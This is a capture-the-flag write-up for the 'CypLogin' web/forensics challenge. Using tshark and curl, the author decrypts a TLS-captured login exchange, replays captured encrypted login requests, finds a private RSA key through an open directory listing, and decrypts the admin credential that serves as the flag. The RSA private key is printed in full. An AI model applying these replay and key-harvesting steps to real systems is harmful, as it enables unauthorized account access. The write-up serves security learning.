
# CypLogin

* Category: Web / Forensics
* 150 points

## Description

> To exchange new information in a secure environment, you should use our cryptographic new login rather the simple one.
>
> However, can you bypass its protections and get the flag anyway?

A PCAP file and a `tlskey.log` file were attached.

## Solution

Solved this one after the CTF ended with a hint from the admin (🙏).

Let's take a look at the PCAP we got. The `tlskey.log` file allows us to view HTTPS traffic.

```console
┌──(user@kali)-[/media/sf_CTFs/appsec/CypLogin]
└─$ tshark -r dump.pcapng -o "tls.desegment_ssl_records: TRUE" -o "tls.desegment_ssl_application_data: TRUE" -o "tls.keylog_file:/media/sf_CTFs/appsec/CypLogin/tlskey.log" | tail
-n 30
  568  51.709221 172.26.255.42 → 172.26.240.1 DNS 87 Standard query 0x4897 A cyplogin.appsecil.ctf.today
  569  51.709275 172.26.255.42 → 3.70.105.34  HTTP2 512 HEADERS[37]: GET /login_api.php?un=clgyMHRibThGaVR3OElsZkpnN3NZamo2TDM3RjhmUzF4S0pyWlhXK3J4MTdDang1S2RWcWxDUFZVWEx6S3B1RkxOTk96TzRsbUZQSEVGa0xDTTZLTUFldW9JT3FFS0lnKzcwSWU0MzZCNHFveFFqSFRkYVR3c3JkclBBcHIwVkk5Y3p5bUFQMzhQSnJlUlZUWDVySlUvMkFxajZNSmZIZGlRYjhVc2tvMUZKTGhScE03SzVQbzkvNzZpdHJTdE9OazNnc1JMZzNkdGQ3Y2UxdGIzY3BEYXJUbnA4T0VTY0tpVXdnNFQwR3RHM25UOEFFZ0V3Z3Q3L2NYRnA0c0JURmFmeEtSd2hmNWJ0TFNjZ1hXWjgvZlRVMGJ4d1hBdmFGTzVXamt2WFdrOEJYRTBuakovVFdpOUZsSGJCUnBEK0RXVXdGOUxsTGU2VFhzQWUzMStwS3JBPT0=, WINDOW_UPDATE[37]
  570  51.709886 172.26.240.1 → 172.26.255.42 DNS 146 Standard query response 0x4897 A cyplogin.appsecil.ctf.today A 3.70.105.34 A 52.29.18.37
  571  51.710118 172.26.255.42 → 172.26.240.1 DNS 87 Standard query 0x5583 A cyplogin.appsecil.ctf.today
  572  51.710677 172.26.240.1 → 172.26.255.42 DNS 146 Standard query response 0x5583 A cyplogin.appsecil.ctf.today A 3.70.105.34 A 52.29.18.37
  573  51.711419 172.26.255.42 → 172.26.240.1 DNS 87 Standard query 0x6c69 A cyplogin.appsecil.ctf.today
  574  51.711557 172.26.255.42 → 3.70.105.34  HTTP2 509 HEADERS[39]: GET /login_api.php?un=ZHkxM0paenRuakwyOXkyYlJvWEZGc0wwV2g2OVI0QnVlRG4yRC94YW1nL3pSZGRJeU9ObDlHY0wvTTRwWkFOYUFBNjl4aGJSa2cxTkxBT0dUWEY5bEFKTERqNXB4dkE4bnBZQ3krZTFxa0owQTB2eGpQN2R2Wk1iN0ZqWi8wRGZNbzJNZzBja2p4bjFlK1c3VDdDVDMvazlCR0Q4cktXYWNTS3loczBMYXYvcG1KQmVjcTJXMnBCUzRYWXF2OWFuUC95ZHc5NDhxYmovam9PVWU5M21CVUFPWnNVWUl6VENuYmhPS1hJak9rSUVLcGVNaVFKM3NDMTJoT2lRR2lWa2k4bDlyNTdkaVJPWXlQZU56UnRjSHVOYm9peTVsNTNmUnJpQlQrSk45cFpJRm5iN1QxUkdaamtvclhxZ3NpVzhsc1BzN1BXSS9GMmdVUUEwVmxEcnZBPT0=, WINDOW_UPDATE[39]
  575  51.711949 172.26.240.1 → 172.26.255.42 DNS 146 Standard query response 0x6c69 A cyplogin.appsecil.ctf.today A 3.70.105.34 A 52.29.18.37
  576  51.712134 172.26.255.42 → 172.26.240.1 DNS 87 Standard query 0xf5e3 A cyplogin.appsecil.ctf.today
  577  51.712567 172.26.240.1 → 172.26.255.42 DNS 146 Standard query response 0xf5e3 A cyplogin.appsecil.ctf.today A 3.70.105.34 A 52.29.18.37
  578  51.777997  3.70.105.34 → 172.26.255.42 HTTP2 286 HEADERS[37]: 200 OK, DATA[37]
  579  51.778218  3.70.105.34 → 172.26.255.42 HTTP2 85 DATA[37] (text/html)
  580  51.779616  3.70.105.34 → 172.26.255.42 HTTP2 286 HEADERS[39]: 200 OK, DATA[39]
  581  51.779824  3.70.105.34 → 172.26.255.42 HTTP2 85 DATA[39] (text/html)
  582  55.374655 172.26.255.42 → 172.26.240.1 DNS 87 Standard query 0x3a1c A cyplogin.appsecil.ctf.today
  583  55.374880 172.26.255.42 → 3.70.105.34  HTTP2 510 HEADERS[41]: GET /login_api.php?un=bVVoNkJnNlN4NVR3L2svaExmQWpIM0J4RTRnK2xVUXRUSVlRd2JTcm1SV2ljRmN3QjJTSDBmZWQrRnBycUxEVXRpR2lwRnhGN1o5ZkZCNGYzcFh2NmttR05XdnROWktkWTl5STU4QnFaZGNjZHFWSFh1RUtxOGFkUmFLLzRuWmwwNTM1c2QrOElvWG13eThtQ0lwalhoU3gvaEtSTkJHU3VOZytvMStQNFg2M0tRbkU2UFQzSDhBNlRDT0Y4NTJkVThlWENoVlFRT3BZdEtLTTNpMHI0UVN2R2YvdVlLVGhqSUFtbmVSRnhZbFkyOXM5eE04QjhUSUFSMWZzSUE4QzRPL25GYy81TTdSMllXSFVsS1J0WFIzRjdiN25iRUUwS2JkdG9XTnpZck1LQjcyQTk0ZWxYb0RXOEswWFlkT0x1Vk8xd0RKV0xudUhCKzZIUjNteVBBPT0=, WINDOW_UPDATE[41]
  584  55.375253 172.26.240.1 → 172.26.255.42 DNS 146 Standard query response 0x3a1c A cyplogin.appsecil.ctf.today A 3.70.105.34 A 52.29.18.37
  585  55.375484 172.26.255.42 → 172.26.240.1 DNS 87 Standard query 0xb008 A cyplogin.appsecil.ctf.today
  586  55.376027 172.26.240.1 → 172.26.255.42 DNS 146 Standard query response 0xb008 A cyplogin.appsecil.ctf.today A 3.70.105.34 A 52.29.18.37
  587  55.376171 172.26.255.42 → 172.26.240.1 DNS 87 Standard query 0x6a97 AAAA cyplogin.appsecil.ctf.today
  588  55.376456 172.26.255.42 → 3.70.105.34  HTTP2 510 HEADERS[43]: GET /login_api.php?un=ZkR6K1B3MTJpbDNCODhKeklNcjYzNHhKRTFOMVBHUVVDdW9lMXNveXBNc3doTEs2ZE85L3dvNUEzMW5jWHltR2RaY0tsMFVsWU4yWWMwTmswVXZaMGpUR0llMzVZRGJwK082UmM1K2JiM1g2Z2FDZlVVOEx1ZjQyeGRqOGFxNjlUNmxDRnJ2cCtYNXJxN25FU1pRMGtDc3hERnIwY2poNWpOTVlhT0xJa0pjQjI5eVdESnl3VWtycEs1QmVpQWx1eFh1N3U5VnJsV29USjRpMWZhVHBLZjlUZklOZWxVVUJKVHN2bXdOeHlFSU1LVDNrbnZYdkRuWStKRVM5K1llK3JEckxRV29XSDZuc1NUYktoVWZ2eERRczl5ZW9OWXdLTTZmbGxreStVd25aUFZXbEhlSEJTM1BUZGM0WGs4ZzNrSXpGYjhEakUxdUlrNXAybVQrNThBPT0=, WINDOW_UPDATE[43]
  589  55.395658 172.26.255.42 → 172.26.240.1 DNS 87 Standard query 0x6a97 AAAA cyplogin.appsecil.ctf.today
  590  55.443679  3.70.105.34 → 172.26.255.42 HTTP2 299 HEADERS[41]: 200 OK, DATA[41]
  591  55.443907  3.70.105.34 → 172.26.255.42 HTTP2 85 DATA[41] (text/html)
  592  55.444105  3.70.105.34 → 172.26.255.42 HTTP2 330 DATA[43] (text/html)
  593  55.451652 172.26.240.1 → 172.26.255.42 DNS 174 Standard query response 0x6a97 AAAA cyplogin.appsecil.ctf.today SOA ns-1633.awsdns-12.co.uk
  594  59.258073 172.26.255.42 → 69.16.175.42 HTTP2 93 PING[0]
  595  59.313835 69.16.175.42 → 172.26.255.42 HTTP2 93 PING[0]
  596  60.259799 172.26.255.42 → 146.75.122.208 HTTP2 100 PING[0]
  597  60.316825 146.75.122.208 → 172.26.255.42 HTTP2 100 PING[0]
```

The user is trying to access `cyplogin.appsecil.ctf.today/`, what's there?

```html
<form>
  <div class="form-outline mb-4">
    <input type="text" id="form2Example1" class="form-control" />
    <label class="form-label" for="form2Example1">Username</label>
  </div>
  <div class="form-outline mb-4">
    <input type="password" id="form2Example2" class="form-control" />
    <label class="form-label" for="form2Example2">Password</label>
  </div>
  <div class="row mb-4">
    <div class="col d-flex justify-content-left">
      <div class="form-check">
        <input class="form-check-input" type="checkbox" value="" id="form2Example31" checked />
        <label class="form-check-label" for="form2Example31"> Remember me </label>
      </div>
    </div>
  </div>
  <input type="submit" id="connect" class="btn btn-primary btn-block mb-4" value="Connect">
  <div class="text-center">
    <p>Need an account? Contact IT support.</a></p>
  </div>
</form>
```

It's a login form, with a twist in one of the Javascript files:

```javascript
$(function () {

    $("#badmsg").hide();
    $("#okmsg").hide();

    $("#connect").on( "click", function( event ) {
      event.preventDefault();
        var pub = `
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4bLRQC/NMtVgvVxrxBXg
KwU1xpYFA+bONPnAmYw9QmaBWnitHfjAXDjMR+/f8TtuJVk1ikt/aJ7W0MkzyznN
laRcAfvIUteN9gksZ0zhNl0d7pFVcwgm2yn52XgAafcHCumrCOlG7G/iClfHJB/w
UAWfmPeDP9ij1COYT20/9OiI/0XFCNps99l+CnPyqKOgn4+KJLnAjCapWwxJFqKm
JKTi2MvPQV7Pa1arcNRko10xd5oygouyMRQsjcz407wFCxNwUOx4zNImEENG+24g
POOiUagk7KD2DWj+M6q/IgLztTpW+nP/QH40UoWcXGPMgiCC9aGhJ2NnKKFY+Oht
5wIDAQAB
-----END PUBLIC KEY-----
`;
          var userName = $("#form2Example1").val();
          var password = $("#form2Example2").val();
          var encrypt = new JSEncrypt();
          encrypt.setPublicKey(pub);
          var encrypted = btoa(encrypt.encrypt(userName+":"+password));
          $.get("login_api.php?un="+encrypted, function(data, status){
            if(data == "wrong username / password."){
               $("#badmsg").show();
               $("#badmsg").html(data);
               $("#okmsg").hide();
            }else{
               $("#badmsg").hide();
               $("#okmsg").show();
               $("#okmsg").html(data);
              // need to fix that secret path
              //window.location=data;
            }
          });
          return false;
      });

});
```

Instead of sending the username and password on the clear, it first encrypts them with a public key, then base64-encodes them.  
That must be what we see in the network capture.

We can resend the requests to see what we get:

```console
┌──(user@kali)-[/media/sf_CTFs/appsec/CypLogin]
└─$ curl "https://cyplogin.appsecil.ctf.today/login_api.php?un=clgyMHRibThGaVR3OElsZkpnN3NZamo2TDM3RjhmUzF4S0pyWlhXK3J4MTdDang1S2RWcWxDUFZVWEx6S3B1RkxOTk96TzRsbUZQSEVGa0xDTTZLTUFldW9JT3FFS0lnKzcwSWU0MzZCNHFveFFqSFRkYVR3c3JkclBBcHIwVkk5Y3p5bUFQMzhQSnJlUlZUWDVySlUvMkFxajZNSmZIZGlRYjhVc2tvMUZKTGhScE03SzVQbzkvNzZpdHJTdE9OazNnc1JMZzNkdGQ3Y2UxdGIzY3BEYXJUbnA4T0VTY0tpVXdnNFQwR3RHM25UOEFFZ0V3Z3Q3L2NYRnA0c0JURmFmeEtSd2hmNWJ0TFNjZ1hXWjgvZlRVMGJ4d1hBdmFGTzVXamt2WFdrOEJYRTBuakovVFdpOUZsSGJCUnBEK0RXVXdGOUxsTGU2VFhzQWUzMStwS3JBPT0="
wrong username / password.

┌──(user@kali)-[/media/sf_CTFs/appsec/CypLogin]
└─$ curl "https://cyplogin.appsecil.ctf.today/login_api.php?un=ZkR6K1B3MTJpbDNCODhKeklNcjYzNHhKRTFOMVBHUVVDdW9lMXNveXBNc3doTEs2ZE85L3dvNUEzMW5jWHltR2RaY0tsMFVsWU4yWWMwTmswVXZaMGpUR0llMzVZRGJwK082UmM1K2JiM1g2Z2FDZlVVOEx1ZjQyeGRqOGFxNjlUNmxDRnJ2cCtYNXJxN25FU1pRMGtDc3hERnIwY2poNWpOTVlhT0xJa0pjQjI5eVdESnl3VWtycEs1QmVpQWx1eFh1N3U5VnJsV29USjRpMWZhVHBLZjlUZklOZWxVVUJKVHN2bXdOeHlFSU1LVDNrbnZYdkRuWStKRVM5K1llK3JEckxRV29XSDZuc1NUYktoVWZ2eERRczl5ZW9OWXdLTTZmbGxreStVd25aUFZXbEhlSEJTM1BUZGM0WGs4ZzNrSXpGYjhEakUxdUlrNXAybVQrNThBPT0="
The password is the key to the kingdom.
```

So we're looking for the password. Can we attack the public key?

```console
┌──(user@kali)-[/media/sf_CTFs/appsec/CypLogin]
└─$ openssl rsa -pubin -in key.pub -text
RSA Public-Key: (2048 bit)
Modulus:
    00:e1:b2:d1:40:2f:cd:32:d5:60:bd:5c:6b:c4:15:
    e0:2b:05:35:c6:96:05:03:e6:ce:34:f9:c0:99:8c:
    3d:42:66:81:5a:78:ad:1d:f8:c0:5c:38:cc:47:ef:
    df:f1:3b:6e:25:59:35:8a:4b:7f:68:9e:d6:d0:c9:
    33:cb:39:cd:95:a4:5c:01:fb:c8:52:d7:8d:f6:09:
    2c:67:4c:e1:36:5d:1d:ee:91:55:73:08:26:db:29:
    f9:d9:78:00:69:f7:07:0a:e9:ab:08:e9:46:ec:6f:
    e2:0a:57:c7:24:1f:f0:50:05:9f:98:f7:83:3f:d8:
    a3:d4:23:98:4f:6d:3f:f4:e8:88:ff:45:c5:08:da:
    6c:f7:d9:7e:0a:73:f2:a8:a3:a0:9f:8f:8a:24:b9:
    c0:8c:26:a9:5b:0c:49:16:a2:a6:24:a4:e2:d8:cb:
    cf:41:5e:cf:6b:56:ab:70:d4:64:a3:5d:31:77:9a:
    32:82:8b:b2:31:14:2c:8d:cc:f8:d3:bc:05:0b:13:
    70:50:ec:78:cc:d2:26:10:43:46:fb:6e:20:3c:e3:
    a2:51:a8:24:ec:a0:f6:0d:68:fe:33:aa:bf:22:02:
    f3:b5:3a:56:fa:73:ff:40:7e:34:52:85:9c:5c:63:
    cc:82:20:82:f5:a1:a1:27:63:67:28:a1:58:f8:e8:
    6d:e7
Exponent: 65537 (0x10001)
writing RSA key
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4bLRQC/NMtVgvVxrxBXg
KwU1xpYFA+bONPnAmYw9QmaBWnitHfjAXDjMR+/f8TtuJVk1ikt/aJ7W0MkzyznN
laRcAfvIUteN9gksZ0zhNl0d7pFVcwgm2yn52XgAafcHCumrCOlG7G/iClfHJB/w
UAWfmPeDP9ij1COYT20/9OiI/0XFCNps99l+CnPyqKOgn4+KJLnAjCapWwxJFqKm
JKTi2MvPQV7Pa1arcNRko10xd5oygouyMRQsjcz407wFCxNwUOx4zNImEENG+24g
POOiUagk7KD2DWj+M6q/IgLztTpW+nP/QH40UoWcXGPMgiCC9aGhJ2NnKKFY+Oht
5wIDAQAB
-----END PUBLIC KEY-----
```

Long story short, we can't. BUT - this isn't a crypto challenge anyway, it's a web/forensics challenge. We've done some forensics, let's do some web:

```console
┌──(user@kali)-[/media/sf_CTFs/appsec/CypLogin]
└─$ curl "https://cyplogin.appsecil.ctf.today/robots.txt"
User-agent: Googlebot
Disallow: /js
Disallow: /css
Disallow: /uploads
Disallow: /admin
```

If we inspect the "/uploads" directory, we find a pleasant surprise:

```console

┌──(user@kali)-[/media/sf_CTFs/appsec/CypLogin]
└─$ curl "https://cyplogin.appsecil.ctf.today/uploads/"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /uploads</title>
 </head>
 <body>
<h1>Index of /uploads</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="05052023/">05052023/</a></td><td align="right">2023-05-17 13:27  </td><td align="right">  - </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.52 (Debian) Server at cyplogin.appsecil.ctf.today Port 80</address>
</body></html>

┌──(user@kali)-[/media/sf_CTFs/appsec/CypLogin]
└─$ curl "https://cyplogin.appsecil.ctf.today/uploads/05052023/"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /uploads/05052023</title>
 </head>
 <body>
<h1>Index of /uploads/05052023</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/uploads/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="key.pem">key.pem</a></td><td align="right">2023-05-17 13:27  </td><td align="right">1.6K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.52 (Debian) Server at cyplogin.appsecil.ctf.today Port 80</address>
</body></html>

┌──(user@kali)-[/media/sf_CTFs/appsec/CypLogin]
└─$ curl https://cyplogin.appsecil.ctf.today/uploads/05052023/key.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4bLRQC/NMtVgvVxrxBXgKwU1xpYFA+bONPnAmYw9QmaBWnit
HfjAXDjMR+/f8TtuJVk1ikt/aJ7W0MkzyznNlaRcAfvIUteN9gksZ0zhNl0d7pFV
cwgm2yn52XgAafcHCumrCOlG7G/iClfHJB/wUAWfmPeDP9ij1COYT20/9OiI/0XF
CNps99l+CnPyqKOgn4+KJLnAjCapWwxJFqKmJKTi2MvPQV7Pa1arcNRko10xd5oy
gouyMRQsjcz407wFCxNwUOx4zNImEENG+24gPOOiUagk7KD2DWj+M6q/IgLztTpW
+nP/QH40UoWcXGPMgiCC9aGhJ2NnKKFY+Oht5wIDAQABAoIBAQCP7Zm1ZgZkcWBU
wZhTnmOq65KkhkzCdTBw5ggloyH5syawTB6R62y4Itxaz6Su0GhoVuBmxciFLi3t
TTHDWqQ41mx6M1dHRQDZsnXnlkZUhcMtvO6SAdPNlZIoVXdmG8sY8XRJpYG+C4dJ
czqiVd/JGBzzznubforTILPjitbrVR/kVnVwgIXoy+tQ6WD9WkAuvHfTwARwanh6
sJQ4pRWqh48HO+zFiIMvKDtfArFsy44pfCLcbqr3vSBMnci62I0Cqe/eEGF+sg8R
hjkMgr4bN2bNuZ3JCBS0o5uS7RJBCXH2li6rzju8uhBB7bxsq7VdnLSf3JODQLvD
u+JtiTZxAoGBAP4QIs4EE8a9GFI05q9O3TVF5uLWpfosfGWMz+q96fl/mjaNu23H
nuoUUGkQoD5qFpgLy1DhCZPzjTCYfQJL3K7UyxV8gsO8cZG7mCedsDngdogAb7o4
trfluiEf4Xq0iadQKH59PMZHs5Y2HshMajAOMBL7hYdcyaR/94GHY3jvAoGBAONr
UkRPPjcU6Bds4FGAh3ieNFi6Bs/1E7ut4xdKTN1uEhsafViQ//57EFztlAQFwULh
foBbCcHUY84+6jxkvcnm1H00pFFtY3Qk6B2zokIVXKsMUBg2vJEstcpGa9ERGRxf
CpkC6n+MnIxiThqeY/LGzbX+R6sqz6uQKGLDgqqJAoGBANXwmo5nKowZYeifuX34
aBhbM7Di1cOUQHB3IgJnSCacSC0WLrWj+nLdBlVi9b15Mmt4yw3hYmJfHg7E6cfM
QBpNAHKodakD/5KbqOX7SJGELewaifsDlQHIhnMsWIAulRf6TQ8uwMWrTVP5YPSE
PIsY92yUtv2kqfxG8hH2A1KrAoGAWCWu+18jpEHsO7gtsil5WN0pOQLRxSUfAu3B
SbO421LgnbTExOFe+ApHK13Cs1Rvtjaky6d9vq1OChEExWfe0DUyQ112G0Gk/M2Z
Unnf+HFDO+FH4jrFGBgWVlK5U42nCAImn2wr7EhaHWe1Ekg2QVGhRltK+CNd3we/
P5i8OtECgYBNBKR0BnwU1cOtmKQk3Qw3jfUWqRfveNoB8p+ceTdiqs8FO9l9LZXz
CcuDqVFMMMwGPW9eLYLwd/MoeXdtmo33xXwsFAG/jPfimN45KWmsqwE8bpoDBHTv
TkuvNOYzJslyd6zYbcArdO7a48IkBVQy0s6VvvIuQLMG8ZkwrrNWVA==
-----END RSA PRIVATE KEY-----
```

Let's use it to decrypt:

```console
┌──(user@kali)-[/media/sf_CTFs/appsec/CypLogin]
└─$ echo ZkR6K1B3MTJpbDNCODhKeklNcjYzNHhKRTFOMVBHUVVDdW9lMXNveXBNc3doTEs2ZE85L3dvNUEzMW5jWHltR2RaY0tsMFVsWU4yWWMwTmswVXZaMGpUR0llMzVZRGJwK082UmM1K2JiM1g2Z2FDZlVVOEx1ZjQyeGRqOGFxNjlUNmxDRnJ2cCtYNXJxN25FU1pRMGtDc3hERnIwY2poNWpOTVlhT0xJa0pjQjI5eVdESnl3VWtycEs1QmVpQWx1eFh1N3U5VnJsV29USjRpMWZhVHBLZjlUZklOZWxVVUJKVHN2bXdOeHlFSU1LVDNrbnZYdkRuWStKRVM5K1llK3JEckxRV29XSDZuc1NUYktoVWZ2eERRczl5ZW9OWXdLTTZmbGxreStVd25aUFZXbEhlSEJTM1BUZGM0WGs4ZzNrSXpGYjhEakUxdUlrNXAybVQrNThBPT0= | base64 -d | base64 -d | openssl rsautl -decrypt -inkey key.pem
admin:AppSec-IL{Wh7t_D4_F7ck_RS4}
```